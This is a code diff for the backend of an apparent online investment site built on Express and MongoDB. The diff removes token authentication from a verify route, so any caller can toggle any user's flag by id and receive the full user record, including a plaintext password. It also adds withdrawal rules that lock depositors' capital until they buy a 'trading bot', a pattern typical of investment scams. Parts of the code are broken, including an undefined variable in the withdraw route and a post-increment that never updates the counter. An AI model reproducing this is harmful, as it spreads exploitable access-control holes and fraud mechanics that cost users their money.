@@ -23,32 +23,41 @@ mongoose.connect(process.env.ATLAS_URI).then(() => {
     console.error('Error connecting to MongoDB:', error);
 });
 
-app.get('/api/verify', async (req, res) => {
-  const token = req.headers['x-access-token']
+app.post('/api/verify', async (req, res) => {
+  const  {
+    id
+  } = req.body
+  const user = await User.findOne({ _id: id })
+  
+  console.log(user)
   try {
-    const decode = jwt.verify(token, jwtSecret)
-    const email = decode.email
-    const user = await User.findOne({ email: email })
-    if(user.rememberme){
-      res.json({
-        status: 'ok',
+    if (user.tradebotstatus) {
+      await User.updateOne({ _id: id }, {
+          tradebotstatus: false
       })
+      res.json({
+        status: 200,tradebotstatus:user
+    })
     }
-    else{
-      res.json({
-        status: 'false',
+    else {
+     await User.updateOne({ _id: id }, {
+          tradebotstatus: true
       })
+      res.json({
+        status: 201,tradebotstatus:user
+    })
     }
   } catch (error) {
-    res.json({ status: `error ${error}` })
+    res.json({ status:400, message: `error ${error}` })
   }
 })
+
 
 // register route 
 app.post(
   '/api/register',
   async (req, res) => {
-    const { firstName, lastName, userName, password, email, referralLink } = req.body;
+    const { firstName, lastName, userName, password, email, referralLink, country, phone } = req.body;
     const now = new Date();
 
     try {
@@ -89,6 +98,8 @@ app.post(
         firstname: firstName,
         lastname: lastName,
         username: userName,
+        phonenumber: phone,
+        country:country,
         email,
         password: password,
         funded: 0,
@@ -100,6 +111,7 @@ app.post(
         refBonus: 0,
         referred: [],
         periodicProfit: 0,
+        investCount:0,
         upline: referralLink || null,
       });
 
@@ -196,6 +208,8 @@ app.get('/api/getData', async (req, res) => {
       deposit: user.deposit,
       promo: user.promo,
       periodicProfit: user.periodicProfit,
+      tradebotstatus: user.tradebotstatus,
+      investCount:user.investCount
     });
   } catch (error) {
     console.error('Error fetching user data:', error.message);
@@ -267,7 +281,8 @@ app.post('/api/fundwallet', async (req, res) => {
       $set : {
         funded: incomingAmount + user.funded,
         capital :user.capital + incomingAmount,
-        totaldeposit: user.totaldeposit + incomingAmount
+        totaldeposit: user.totaldeposit + incomingAmount,
+        investCount:0
       }}
     )
     const upline = await User.findOne({ username: user.upline })
@@ -390,7 +405,46 @@ app.post('/api/withdraw', async (req, res) => {
     const decode = jwt.verify(token, jwtSecret)
     const email = decode.email
     const user = await User.findOne({ email: email })
-    if (user.funded >= req.body.WithdrawAmount ) {
+
+    if (tradebotstatus) {
+      if (user.capital >= req.body.WithdrawAmount) {
+        await User.updateOne(
+        { email: email },
+        { $set: { funded: user.funded - req.body.WithdrawAmount, totalwithdraw: user.totalwithdraw + req.body.WithdrawAmount, capital: user.capital - req.body.WithdrawAmount }}
+      )
+      await User.updateOne(
+        { email: email },
+        { $push: { withdraw: {
+          date:new Date().toLocaleString(),
+          amount:req.body.WithdrawAmount,
+          id:crypto.randomBytes(32).toString("hex"),
+          balance: user.funded - req.body.WithdrawAmount
+        } } }
+      )
+      const now = new Date()
+      await User.updateOne(
+        { email: email },
+        { $push: { transaction: {
+          type:'withdraw',
+          amount: req.body.WithdrawAmount,
+          date: now.toLocaleString(),
+          balance: user.funded - req.body.WithdrawAmount,
+          id:crypto.randomBytes(32).toString("hex"),
+        } } }
+      )
+      return res.json({
+            status: 'ok',
+            withdraw: req.body.WithdrawAmount,
+            email: user.email,
+            name: user.firstname,
+            message: `We have received your withdrawal order, kindly exercise some patience as our management board approves your withdrawal`,
+            subject: 'Withdrawal Order Alert',
+            adminMessage: `Hello BOSS! a user with the name ${user.firstname} placed withdrawal of $${req.body.WithdrawAmount} USD, to be withdrawn into ${req.body.wallet} ${req.body.method} wallet`,
+      })
+      }
+      
+    }
+    else if (user.totalprofit >= req.body.WithdrawAmount ) {
       await User.updateOne(
         { email: email },
         { $set: { funded: user.funded - req.body.WithdrawAmount, totalwithdraw: user.totalwithdraw + req.body.WithdrawAmount, capital: user.capital - req.body.WithdrawAmount }}
@@ -432,7 +486,7 @@ app.post('/api/withdraw', async (req, res) => {
       subject:'Failed Withdrawal Alert',
       email: user.email,
       name: user.firstname,
-      withdrawMessage:`We have received your withdrawal order, but you can only withdraw you insufficient amount in your account. Kindly deposit and invest more, to rack up more profit, Thanks.`
+      withdrawMessage:`We have received your withdrawal order, but you can only withdraw your profit. To withdraw capital and profit, you will have to purchase a third-party trading bot in the trading bot page, Thanks.`
       })
   }}
    catch (error) {
@@ -524,28 +578,30 @@ app.post('/api/invest', async (req, res) => {
     const email = decode.email
     const user = await User.findOne({ email: email })
 
+    if (user.investCount === 3) {
+      res.json({ status: 403, message: 'Re-investment limit Reached, deposit to keep investing' })
+      return
+    }
+
     const money = (() => {
       switch (req.body.percent) {
-        case '20%':
-          return (req.body.amount * 20) / 100
-        case '35%':
-          return (req.body.amount * 35) / 100
-        case '50%':
-          return (req.body.amount * 50) / 100
-        case '65%':
-          return (req.body.amount * 65) / 100
-        case '80%':
-          return (req.body.amount * 80) / 100
-        case '100%':
-          return (req.body.amount * 100) / 100
+        case '2%':
+          return (req.body.amount * 2) / 100
+        case '3%':
+          return (req.body.amount * 3) / 100
+        case '4%':
+          return (req.body.amount * 4) / 100
+        case '8%':
+          return (req.body.amount * 8) / 100
       }
     })()
+    
     if (user.capital >= req.body.amount) {
       const now = new Date()
       await User.updateOne(
         { email: email },
         {
-          $set: {capital : user.capital - req.body.amount, totalprofit : user.totalprofit + money ,withdrawDuration: now.getTime()},
+          $set: {capital : user.capital - req.body.amount, totalprofit : user.totalprofit + money ,withdrawDuration: now.getTime(),investCount: user.investCount++},
         }
       )
       await User.updateOne(
